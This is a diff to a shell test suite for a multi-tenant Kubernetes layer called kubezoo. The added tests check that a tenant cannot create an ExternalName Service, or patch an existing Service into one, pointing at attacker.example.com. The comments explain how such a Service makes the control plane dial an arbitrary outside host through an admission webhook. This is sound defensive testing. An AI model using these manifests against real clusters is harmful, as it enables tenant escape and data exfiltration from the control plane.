@@ -3812,6 +3812,34 @@ for csi_res in volumeattachments csidrivers csinodes csistoragecapacities; do
 done
 
 
+# --- the URL that is not called a URL --------------------------------------
+# ⛔ kubezoo refuses a webhook's clientConfig.url because "a URL cannot be
+# confined to the tenant; use clientConfig.service". That reasoning assumes a
+# Service in the tenant's namespace can only reach the tenant's own pods -- true
+# of ClusterIP, FALSE of ExternalName. Upstream's ResolveCluster has an explicit
+# ExternalName branch returning https://<externalName>:<port>, so the apiserver
+# would dial an arbitrary host FROM THE CONTROL PLANE, carrying an
+# AdmissionReview. Not gated on --enable-aggregator-routing: the default
+# resolver is the one with that branch.
+expect_denied "an ExternalName service" "control plane will follow\|ExternalName" -- \
+  $T apply -f - <<'EXTNAME'
+apiVersion: v1
+kind: Service
+metadata: {name: ext-name}
+spec: {type: ExternalName, externalName: attacker.example.com}
+EXTNAME
+# ⚠️ And the timing shape the parity test named: an ordinary Service first, then
+# a patch. Nothing revalidates a webhook once written -- the resolver runs at
+# call time -- so the Service write is the last chance.
+$T apply -f - >/dev/null 2>&1 <<'EXTNAME'
+apiVersion: v1
+kind: Service
+metadata: {name: ext-later}
+spec: {ports: [{port: 80}], selector: {app: none}}
+EXTNAME
+expect_denied "and patching an existing service into one" "control plane will follow\|ExternalName" -- \
+  $T patch service ext-later --type=merge -p '{"spec":{"type":"ExternalName","externalName":"attacker.example.com"}}'
+
 # --- and the way round all of it -------------------------------------------
 # ⛔ An inline csi volume names a DRIVER, not a class: no StorageClass, no claim,
 # nothing for the publication check to look at. Measured before it was refused:
